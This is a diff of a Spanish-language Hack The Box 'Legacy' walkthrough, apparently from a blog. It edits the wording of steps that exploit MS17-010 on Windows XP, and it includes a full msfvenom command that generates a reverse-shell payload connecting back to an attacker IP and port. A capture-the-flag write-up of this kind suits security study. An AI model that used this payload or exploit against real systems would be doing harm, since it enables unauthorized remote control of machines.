@@ -171,14 +171,13 @@ ROOT:
 
 Vemos como la anterior vulnerabilidad conseguimos el control de Legacy.
 
-Nuestro próximo objetivo será comprobar si la vulnerabilidad MS17-010, es vulnerable.
+Nuestro próximo objetivo será comprobar si la **vulnerabilidad MS17-010**, es vulnerable.
 
 Googleamos y encontramos este repositorio
 [https://github.com/helviojunior/MS17-010](https://github.com/helviojunior/MS17-010)
 
-Debemos descargar el repositorio, con el comando **git clone.**
+Debemos descargar el repositorio, con el comando **git clone**
 
-Es importante y ejecutar las ordenes desde el propio repositorio, más adelante veremos porque.
 
 Nuestro objetivo es un equipo Windows XP por lo cuál debemos buscar un exploit compatible con ello.
 
@@ -188,7 +187,8 @@ Necesitaremos crear una shellcode como hiciamos anteriormente.
 
 ```msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.25 LPORT=4444 EXITFUNC=thread -f exe -a x86 --platform windows -o ms17-010.exe```
 
-Debemos alojarla en el repositorio anteriormente descargado.
+Es importante y ejecutar las ordenes desde el propio repositorio.
+Debemos alojarla el fichero que hemos creado en el repositorio anteriormente descargado.
 
 
 Abrimos un puerto en escucha
@@ -196,6 +196,7 @@ Abrimos un puerto en escucha
 ![portm17.jpg]({{site.baseurl}}/images/Legacy/portm17.jpg) 
 
 Y ejecutamos el script
+
 
 ![scriptms17.jpg]({{site.baseurl}}/images/Legacy/scriptms17.jpg) 
 
